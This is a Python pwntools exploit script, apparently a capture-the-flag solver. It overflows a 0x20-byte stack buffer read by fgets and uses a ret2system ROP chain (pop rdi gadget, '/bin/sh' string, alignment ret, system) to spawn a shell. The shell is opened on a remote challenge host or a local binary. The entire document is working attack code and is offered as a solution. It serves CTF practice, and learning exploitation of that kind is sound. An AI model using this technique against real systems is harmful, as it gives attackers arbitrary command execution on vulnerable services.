#!/usr/bin/env python3
# Beginners STACK - ret2system (ROP) solver
# vuln_func: buf1 @ rbp-0x20, fgets reads 0x70 bytes -> stack BOF
# No canary / No PIE / NX enabled  => ROP to system("/bin/sh")
from pwn import *

context.binary = elf = ELF("./chall")
context.log_level = "info"

HOST, PORT = "pwn.katagaitai-ctf.net", 9002

# --- gadgets / symbols (static, No PIE) ---
POP_RDI = 0x4016c3            # pop rdi ; ret
RET     = 0x40101a            # ret  (stack alignment for movaps in system)
BINSH   = next(elf.search(b"/bin/sh"))   # 0x402008
SYSTEM  = elf.symbols["system"]          # 0x401050

OFFSET = 0x20 + 0x8          # buf1(rbp-0x20) -> saved RIP = 40

payload  = b"A" * OFFSET
payload += p64(POP_RDI)
payload += p64(BINSH)
payload += p64(RET)
payload += p64(SYSTEM)

def start():
    if args.LOCAL:
        return elf.process()
    return remote(HOST, PORT)

io = start()
io.recvuntil(b"[*] Please input data in 'buf1' ...")
io.sendline(payload)
io.interactive()
